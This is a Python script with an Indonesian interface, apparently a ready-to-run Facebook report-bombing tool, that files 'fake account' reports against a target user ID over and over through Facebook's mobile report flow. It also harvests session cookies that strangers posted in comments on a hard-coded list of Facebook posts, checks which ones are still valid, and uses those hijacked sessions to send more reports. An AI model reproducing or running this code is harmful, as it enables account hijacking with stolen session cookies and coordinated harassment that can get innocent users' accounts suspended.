#! /usr/bin/env python3
import requests, re, json, time, os, sys
from rich.console import Console
from rich import print
from rich.panel import Panel
from requests.exceptions import ConnectionError, ChunkedEncodingError

# List atau penampung
Sukses, Cookie = [], []
# Logo atau banner tools
def Banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    Console(width=47, style="bold hot_pink").print(Panel("[bold white] -[bold white]Coded by[bold green] Rozhak\t[bold white]       -[bold white]Version[bold green] 0.5\n[bold red]\t╔══╦╗───╔═╗───────╔╗╔╗\n[bold red]\t║═╦╣╚╦══╣╬╠═╦═╦═╦╦╣╚╬╬═╦╦═╗\n[bold red]\t║╔╝║╬╠══╣╗╣╩╣╬║╬║╔╣╔╣║║║║╬║\n[bold white]\t╚╝─╚═╝──╚╩╩═╣╔╩═╩╝╚═╩╩╩═╬╗║\n[bold white]\t────────────╚╝──────────╚═╝"))
    return 0
# Get nama akun facebook dari cookie
def Get_Name(cookies):
    with requests.Session() as r:
        r.headers.update({
            'host': 'mbasic.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
            'accept-language': 'id,en;q=0.9',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        })
        response = r.get('https://mbasic.facebook.com', cookies = {'cookie': cookies}).text
        if 'mbasic_logout_button' in str(response):
            return (re.search('Keluar \((.*?)\)', str(response)).group(1).title())
        else:
            Console(width=47, style="bold hot_pink").print(Panel("[italic red]Cookie Facebook Telah Kadaluarsa Atau Akun Terkena Checkpoint!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.2);Login()
# Login menggunakan cookie facebook
def Login():
    try:
        Banner();Console(width=47, style="bold hot_pink").print(Panel("[italic white]Kamu Harus[italic green] Login[italic white] Sebelum Melanjutkan, Pastikan Gunakan[italic red] Akun Tumbal[italic white] Untuk Login!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold hot_pink]╭───", subtitle_align="left"))
        cookies = Console().input("[bold hot_pink]   ╰─> ")
        name, user = Get_Name(cookies), re.search('c_user=(\d+);', str(cookies)).group(1)
        Console(width=47, style="bold hot_pink").print(Panel(f"""[bold white]User :[bold green] {user}
[bold white]Name :[bold yellow] {name}""", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Welcome) [bold green]<[bold yellow]<[bold red]<"))
        open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookies}));time.sleep(3.5);Kirim_Laporan()
    except Exception as e:
        Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));exit()
# Mendapatkan total pengguna online
def Pengguna_Online():
    try:
        with requests.Session() as r:
            response = r.get('https://justpaste.it/b84k9').text
            jumlah = re.search('"viewsText":"(.*?)"', str(response)).group(1)
            online = re.search('"onlineText":"(\d+)"', str(response)).group(1)
        return jumlah, online
    except Exception as e:
        return 0, 0
# Mengirim Laporan Ke Facebook
def Kirim_Laporan():
    try:
        Banner();cookies = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        name, user = Get_Name(cookies), re.search('c_user=(\d+);', str(cookies)).group(1)
        Console(width=47, style="bold hot_pink").print(Panel(f"""[bold white]Name :[bold green] {name}
[bold white]User :[bold yellow] {user}""", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Welcome) [bold green]<[bold yellow]<[bold red]<"))
    except Exception as e:
        Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.2);Login()
    jumlah, online = Pengguna_Online()
    Console(width=47, style="bold hot_pink").print(Panel("[bold green]1[bold white]. Report Using Random Cookies\n[bold green]2[bold white]. Report Use One Cookie\n[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])", title=f"[bold red]>[bold yellow]>[bold green]> [bold blue]Pengguna ({jumlah}/{online}) Online [bold green]<[bold yellow]<[bold red]<", subtitle="[bold hot_pink]╭───", subtitle_align="left"))
    query = Console().input("[bold hot_pink]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(width=47, style="bold hot_pink").print(Panel("[italic white]Silahkan Masukan[italic green] Userid Facebook[italic white], Pastikan Sudah[italic red] Benar[italic white], Misalnya :[italic green] 757953543", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold hot_pink]╭───", subtitle_align="left"))
            userid = Console().input("[bold hot_pink]   ╰─> ")
            Console(width=47, style="bold hot_pink").print(Panel("[italic white]Jika Semua Report[italic red] Gagal[italic white] Mungkin[italic red] Akun Tidak[italic white] Suport Untuk Di Report!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<"))
            if str(userid) in ['757953543', '100024401153970', '100064814153036', '100006609458697']:
                Console().print("[bold hot_pink]   ╰─>[bold red] Failed to Report Protected Account!", end='\r');time.sleep(6.8);exit()
            else:
                Kumpulkan().Cookie(cookies);Cookie.append(f'{cookies}|{user}')
                if len(cookies) == 0:
                    Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]Jumlah Cookie Yang Kamu Kumpulkan Tidak Ada!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));exit()
                else:
                    Laporkan().Random(userid)
                    Console().input("[bold green][[bold white]Kembali[bold green]]");Kirim_Laporan()
        except Exception as e:
            Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
        try:
            Console(width=47, style="bold hot_pink").print(Panel("[italic white]Silahkan Masukan[italic green] Userid Facebook[italic white], Pastikan Sudah[italic red] Benar[italic white], Misalnya :[italic green] 757953543", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold hot_pink]╭───", subtitle_align="left"))
            userid = Console().input("[bold hot_pink]   ╰─> ")
            Console(width=47, style="bold hot_pink").print(Panel("[italic white]Jika Semua Report[italic red] Gagal[italic white] Mungkin[italic red] Akun Tidak[italic white] Suport Untuk Di Report!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Catatan) [bold green]<[bold yellow]<[bold red]<"))
            if str(userid) in ['757953543', '100024401153970', '100064814153036', '100006609458697']:
                Console().print("[bold hot_pink]   ╰─>[bold red] Failed to Report Protected Account!", end='\r');time.sleep(6.8);exit()
            else:
                while (True):
                    try:
                        Cookie.append(f'{cookies}|{user}');Laporkan().Random(userid)
                    except (KeyboardInterrupt):
                        Console().input("[bold green][[bold white]Kembali[bold green]]");Kirim_Laporan()
        except Exception as e:
            Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '3' or query == '03':
        try:os.remove('Data/Cookie.json');exit()
        except:exit()
    else:Kirim_Laporan()
# Laporkan akun facebook random atau singgle
class Laporkan:

    def __init__(self) -> None:
        pass
    # Laporkan akun random cookie
    def Random(self, userid):
        try:
            for z in Cookie:
                self.cookies, self.user_id = z.split('|')[0], z.split('|')[1]
                with requests.Session() as r:
                    r.headers.update({
                        'sec-fetch-dest': 'document',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-site': 'none',
                        'accept-language': 'id,en;q=0.9',
                        'sec-fetch-user': '?1',
                        'host': 'mbasic.facebook.com',
                        'cache-control': 'max-age=0',
                        'sec-fetch-mode': 'navigate',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
                    })

                    r.cookies.update({'cookie': self.cookies})

                    response = r.get('https://mbasic.facebook.com/profile.php?id={}'.format(userid)).text

                    self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                    self.fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response)).group(1)
                    self.eav = re.search('eav=(.*?)"', str(response)).group(1)
                    self.session_id = re.search('session_id%22%3A%22(.*?)%', str(response)).group(1)
                    self.av = re.search('av=(\d+)&', str(response)).group(1)

                    r.headers.update({
                        'referer': 'https://mbasic.facebook.com/profile.php?id={}'.format(userid)
                    })
                    response2 = r.get('https://mbasic.facebook.com/mbasic/more/?owner_id={}&refid=17&paipv=0&eav={}'.format(userid, self.eav)).text
                    r.headers.update({
                        'referer': 'https://mbasic.facebook.com/mbasic/more/?owner_id={}&refid=17&paipv=0&eav={}'.format(userid, self.eav),
                    })

                    response3 = r.get('https://mbasic.facebook.com/cix/screen/basic/frx_tag_selection_screen/?state={"session_id":"'+ self.session_id +'","support_type":"frx","type":2,"initial_action_name":"RESOLVE_PROBLEM","story_location":"profile_someone_else","entry_point":"profile_report_button","actions_taken":"RESOLVE_PROBLEM","reportable_ent_token":"'+ self.user_id +'"}&_rdr').text
                    r.headers.update({
                        'referer': 'https://mbasic.facebook.com/cix/screen/basic/frx_tag_selection_screen/?state=%7B%22session_id%22%3A%22{}%22%2C%22support_type%22%3A%22frx%22%2C%22type%22%3A2%2C%22initial_action_name%22%3A%22RESOLVE_PROBLEM%22%2C%22story_location%22%3A%22profile_someone_else%22%2C%22entry_point%22%3A%22profile_report_button%22%2C%22actions_taken%22%3A%22RESOLVE_PROBLEM%22%2C%22reportable_ent_token%22%3A%22{}%22%7D&_rdr'.format(self.session_id, userid),
                    })
                    response4 = r.get('https://mbasic.facebook.com/cix/screen/basic/frx_report_confirmation_screen/?state={"session_id":"'+ self.session_id +'","support_type":"frx","type":2,"initial_action_name":"RESOLVE_PROBLEM","story_location":"profile_someone_else","entry_point":"profile_report_button","frx_report_action":"REPORT_WITH_CONFIRMATION","rapid_reporting_tags":["profile_fake_account"],"actions_taken":"RESOLVE_PROBLEM","frx_feedback_submitted":true,"reportable_ent_token":"'+ userid +'"}&av='+ self.av +'&_rdr').text

                    r.headers.update({
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://mbasic.facebook.com',
                        'cache-control': 'max-age=0',
                        'referer': 'https://mbasic.facebook.com/cix/screen/basic/frx_report_confirmation_screen/?state=%7B%22session_id%22%3A%22{}%22%2C%22support_type%22%3A%22frx%22%2C%22type%22%3A2%2C%22initial_action_name%22%3A%22RESOLVE_PROBLEM%22%2C%22story_location%22%3A%22profile_someone_else%22%2C%22entry_point%22%3A%22profile_report_button%22%2C%22frx_report_action%22%3A%22REPORT_WITH_CONFIRMATION%22%2C%22rapid_reporting_tags%22%3A%5B%22profile_fake_account%22%5D%2C%22actions_taken%22%3A%22RESOLVE_PROBLEM%22%2C%22frx_feedback_submitted%22%3Atrue%2C%22reportable_ent_token%22%3A%22{}%22%7D&av={}&_rdr'.format(self.session_id, userid, self.user_id),
                    })
                    data = {
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'checked': 'yes',
                        'action': 'Laporkan'
                    }
                    response5 = r.post('https://mbasic.facebook.com/rapid_report/basic/actions/report/confirm/exec/?context={"session_id":"'+ self.session_id +'","support_type":"frx","type":2,"initial_action_name":"RESOLVE_PROBLEM","story_location":"profile_someone_else","entry_point":"profile_report_button","frx_report_action":"REPORT_WITH_CONFIRMATION","rapid_reporting_tags":["profile_fake_account"],"actions_taken":"RESOLVE_PROBLEM","frx_feedback_submitted":true,"reportable_ent_token":"'+ userid +'"}&av='+ self.av +'&paipv=0&eav='+ self.eav, data = data)
                    if 'https://mbasic.facebook.com/?av=' in str(response5.url) and response5.status_code == 200:
                        Console(width=47, style="bold hot_pink").print(Panel(f"""[bold white]Status  :[bold green] Sukses
[bold white]Pelapor :[bold yellow] {self.user_id[:15]}
[bold white]Target  :[bold blue] {userid[:15]}""", title="✔"))
                    else:
                        Console(width=47, style="bold hot_pink").print(Panel(f"""[bold white]Status  :[bold red] Gagal
[bold white]Pelapor :[bold yellow] {self.user_id[:15]}
[bold white]Target  :[bold blue] {userid[:15]}""", title="✘"))
                    for sleep in range(20, 0, -1):
                        time.sleep(1.0);Console().print(f"[bold hot_pink]   ╰─>[bold green] Tunggu {sleep} Detik[bold white]                           ", end = '\r')
            Console().print("\r                                 ", end='\r')
            return 0
        except (ConnectionError, ChunkedEncodingError):
            Console().print("[bold hot_pink]   ╰─>[bold red] Koneksi Error...                      ", end='\r');time.sleep(6.8);self.Laporkan(userid)
# Kumpulkan cookie facebook
class Kumpulkan:

    def __init__(self) -> None:
        pass
    # Mengumpulkan cookie dari komentar
    def Cookie(self, cookies):
        try:
            with requests.Session() as r:
                for url in ['https://web.facebook.com/photo/?fbid=180709230766214&set=a.109878044516000','https://web.facebook.com/rozhak.xyz/posts/10159836876728544:1','https://web.facebook.com/story.php?story_fbid=178570731509812&id=100080706585229','https://web.facebook.com/irsad.siddique.92/posts/213614107297063','https://web.facebook.com/100053586578918/posts/578304527299095/?substory_index=0&app=fbl','https://web.facebook.com/100036939615544/posts/826244578616855/?app=fbl','https://web.facebook.com/100032386028880/posts/674525870303608/?app=fbl','https://web.facebook.com/100018396913729/posts/1143873612902525/?app=fbl','https://web.facebook.com/permalink.php?story_fbid=pfbid0EUT7AjYP5Wgw52DMnPg9pxH9epiQ2ahJ8bjzWbZdynRGiYz9YuPxqcp2ADjRnoiHl&id=100043323630743','https://web.facebook.com/permalink.php?story_fbid=pfbid02vuQiiRx7SWbC5gMPvpR26FHUDY2iJSJqfngYhaLQerbHLirgovBsfJDbFSN6DvAol&id=100086281072244','https://web.facebook.com/permalink.php?story_fbid=pfbid02mzxMS1ouBT89Q6cYcpL4Awpqu29mieMinogmCaTT6oh7KWsXJxcYLRvVMKBpjCS2l&id=100080448395744','https://web.facebook.com/photo/?fbid=5292314014155763&set=a.284532621600619','https://web.facebook.com/103400442502880/posts/pfbid02SjdKPkknsLnwLyNJ3u46pNFgVScfhYgvwtiRLr32zAbx69ZHfWoa9ASkW7G9vJFPl/?app=fbl','https://web.facebook.com/100051967952842/posts/571109557964638/?app=fbl', 'https://web.facebook.com/KM39453/posts/1714009362122228', 'https://web.facebook.com/100033480633498/posts/840643623728318/?app=fbl&_rdc=1&_rdr','https://web.facebook.com/photo/?fbid=137860575762221&set=ecnf.100086148379982']:
                    r.headers.update({
                        'host': 'web.facebook.com',
                        'cache-control': 'max-age=0',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                        'cookie': cookies,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'sec-fetch-dest': 'document',
                        'accept-language': 'id,en;q=0.9'
                    })
                    response = r.get(url).text
                    self.text_ = re.findall('"text":"(.*?)","', str(response))
                    for z in self.text_:
                        if 'c_user' in str(z):
                            r.headers.clear()
                            url = ('https://m.facebook.com/profile.php?')
                            r.headers.update({
                                'upgrade-insecure-requests': '1',
                                'accept-language': 'en-US,en;q=0.9',
                                'host': 'm.facebook.com',
                                'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
                            })
                            response = r.get(url, cookies = {'cookie': z}).text
                            if not 'login.php?next=' in str(response) or not '"ACCOUNT_ID":"0"' in str(response):
                                self.user_id = re.search('"USER_ID":"(\d+)"', str(response)).group(1)
                                if str(self.user_id) in str(Sukses):
                                    continue
                                else:
                                    Sukses.append(self.user_id)
                                    Console().print(f"[bold hot_pink]   ╰─>[bold green] User {self.user_id[:15]}/{len(Cookie)} Sukses...       ", end='\r')
                                    Cookie.append(f'{z}|{self.user_id}')
                            else:
                                Console().print(f"[bold hot_pink]   ╰─>[bold red] User {len(Cookie)} Gagal...                    ", end='\r')
                                continue
                        else:continue
                return 0
        except (ConnectionError, ChunkedEncodingError):
            Console().print("[bold hot_pink]   ╰─>[bold red] Koneksi Error...                      ", end='\r');time.sleep(6.8);self.Cookie(cookies)
        except (KeyboardInterrupt):
            Console().print("\r                             ", end='\r')
            return 1

if __name__ == '__main__':
    try:
        os.system('git pull');Kirim_Laporan()
    except Exception as e:
        Console(width=47, style="bold hot_pink").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]> [bold blue](Error) [bold green]<[bold yellow]<[bold red]<"));exit()
